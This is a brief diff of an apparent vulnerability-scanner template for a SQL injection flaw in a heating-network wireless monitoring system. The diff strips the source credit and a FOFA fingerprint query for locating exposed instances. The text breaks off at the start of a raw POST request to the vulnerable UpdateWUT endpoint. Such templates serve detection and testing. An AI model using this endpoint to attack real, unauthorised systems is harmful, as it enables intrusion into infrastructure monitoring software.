@@ -3,12 +3,8 @@ info:
   name: 热网无线监测系统 SystemManager.asmx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dfqpmk4rsqpzfrvg'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dfqpmk4rsqpzfrvg
-    fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
 http:
 - raw:
   - 'POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
